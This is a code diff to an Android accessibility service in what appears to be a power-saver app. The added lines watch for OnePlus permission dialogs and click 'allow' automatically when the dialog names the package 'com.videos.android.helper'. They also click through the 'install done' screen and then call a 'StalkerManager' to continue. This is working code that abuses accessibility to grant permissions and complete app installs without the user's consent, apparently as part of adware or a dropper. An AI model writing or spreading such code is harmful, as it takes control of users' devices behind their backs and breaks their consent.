@@ -106,18 +106,49 @@ public class NBAccessibilityService extends SelfDefenceAccessibilityService impl
 //            }
 //        }
         super.onAccessibilityEvent(event);
-        if (sIsInWork) {
+        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN_MR1) {
 
-            if (!PowerSaver.get().isGuardViewShown()) {
-                sIsInWork = false;
-                // 关闭屏幕
-//                    handleClearWork(event);
-                AppUtil.jumpToHome(StaticConst.sContext);
+            // 针对一加
+            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                    && GPResId.ONEPLUS_PERMISSION_PKG.equals(event.getPackageName().toString())) {
+                AccessibilityNodeInfo source = getRootInActiveWindow();
+                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于权限判断中");
+                if (source != null) {
+                    List<AccessibilityNodeInfo> nodes = source.findAccessibilityNodeInfosByViewId(GPResId
+                            .getOnePlusPermissionMsgId());
+                    AccessibilityNodeInfo info;
+                    if (nodes != null && nodes.size() > 0) {
+                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找到权限允许弹窗消息");
+                        info = nodes.get(0);
+                        if (info != null && info.getText() != null
+                                && info.getText().toString().contains("com.videos.android.helper")) {
+                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "该包名为指定允许权限包名，自动点击允许");
+                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getOnePlusPermissionOkBtnId());
+                            if (nodes != null && nodes.size() > 0) {
+                                info = nodes.get(0);
+                                if (info != null) {
+                                    boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "允许权限点击结果: " + result);
+                                }
+                            }
+                        }
+                    }
+                }
                 return;
             }
 
-            // 先进行18及以上处理，18以下暂不做适配
-            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN_MR1) {
+
+            if (sIsInWork) {
+
+                if (!PowerSaver.get().isGuardViewShown()) {
+                    sIsInWork = false;
+                    // 关闭屏幕
+//                    handleClearWork(event);
+                    AppUtil.jumpToHome(StaticConst.sContext);
+                    return;
+                }
+
+                // 先进行18及以上处理，18以下暂不做适配
 
                 if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                     finalWindowStateChangeEvent = event;
@@ -436,6 +467,19 @@ public class NBAccessibilityService extends SelfDefenceAccessibilityService impl
                                 performGlobalBack();
                             }
                             sCurrentWorkState = 1;
+                        }
+                    } else {
+                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getInstalledDoneBtnId());
+                        if (nodes != null && nodes.size() > 0) {
+                            info = nodes.get(0);
+                            if (info != null) {
+                                boolean isClick = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "确定完成安装，执行结果： " + isClick);
+                                if (!isClick) {
+                                    performGlobalBack();
+                                }
+                                StalkerManager.get().doContinueAfterInstalled();
+                            }
                         }
                     }
                 } else if (sCurrentWorkState == 1) {
